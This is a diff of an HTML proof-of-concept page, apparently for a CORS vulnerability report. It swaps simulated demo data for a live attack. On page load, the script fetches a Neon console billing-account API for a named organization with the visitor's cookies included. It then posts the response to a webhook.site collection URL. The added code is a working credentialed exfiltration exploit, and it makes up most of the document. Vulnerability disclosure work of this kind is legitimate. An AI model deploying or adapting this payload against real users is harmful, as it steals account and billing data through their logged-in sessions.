@@ -1,27 +1,26 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-  <meta charset="UTF-8">
-  <title>CSRF/Exfiltration PoC Demo</title>
+  <title>PoC Exfiltration</title>
 </head>
 <body>
-  <h2>Exfiltration PoC Demo</h2>
-  <pre id="output">Waiting for simulated fetch...</pre>
+  <h2>Exfiltrating data...</h2>
+  <pre id="output">Waiting...</pre>
 
   <script>
-    // Replace this with your actual webhook URL
-    const webhookUrl = "https://webhook.site/31610c4c-f3be-4956-8fe1-d51b5bfd470e";
-
-    // Simulated data to demonstrate sending to your webhook
-    const simulatedData = {
-      organization: "org-round-lab-67110498",
-      billing_account: "DEMO_ACCOUNT",
-      secret_info: "This is safe demo data"
-    };
-
-    async function sendDataToWebhook(data) {
+    async function exfiltrate() {
       try {
-        const response = await fetch(webhookUrl, {
+        // Fetch data from the target (CORS vulnerable)
+        let response = await fetch("https://console.neon.tech/api/v2/organizations/org-round-lab-67110498/billing/account", {
+          method: "GET",
+          credentials: "include" // important: sends cookies/session
+        });
+
+        let data = await response.json();
+        document.getElementById("output").textContent = JSON.stringify(data, null, 2);
+
+        // Send data to your webhook
+        await fetch("https://webhook.site/1b41bc5c-4ca7-435a-b8be-7e42ded1d4f8", {
           method: "POST",
           headers: {
             "Content-Type": "application/json"
@@ -29,18 +28,12 @@
           body: JSON.stringify(data)
         });
 
-        if (response.ok) {
-          document.getElementById("output").textContent = "Data successfully sent to webhook:\n" + JSON.stringify(data, null, 2);
-        } else {
-          document.getElementById("output").textContent = "Failed to send data. HTTP status: " + response.status;
-        }
       } catch (err) {
-        document.getElementById("output").textContent = "Error sending data: " + err;
+        document.getElementById("output").textContent = "Error: " + err;
       }
     }
 
-    // Run PoC
-    sendDataToWebhook(simulatedData);
+    exfiltrate();
   </script>
 </body>
 </html>
